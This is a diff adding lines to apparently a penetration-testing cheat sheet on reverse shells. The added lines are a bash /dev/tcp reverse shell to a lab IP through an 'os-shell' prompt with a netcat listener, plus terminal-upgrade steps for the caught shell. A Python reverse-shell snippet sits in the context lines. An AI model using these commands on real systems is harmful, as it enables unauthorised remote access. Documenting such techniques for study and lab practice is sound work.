@@ -106,6 +106,9 @@ Attackers often use:
 - **Stealthier**: Easier to blend in with normal outbound traffic.
 - **Useful in restricted environments**: Especially when only outbound connections are allowed.
 
+	Let's run a bash reverse shell for our service running: # nc -lvnp 443
+	os-shell> bash -c "bash -i >& /dev/tcp/10.10.15.146/443 0>&1"
+
 ---
 
 ### 🧰 Common Tools & Payloads
@@ -143,6 +146,20 @@ s=socket.socket();s.connect(("attacker_ip",4444))
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
 subprocess.call(["/bin/sh","-i"])
 ```
+
+
+---
+We beautify the reverse shell:
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+CTRL+Z
+
+stty raw -echo
+
+fg
+
+export TERM=xterm
 
 ---
 
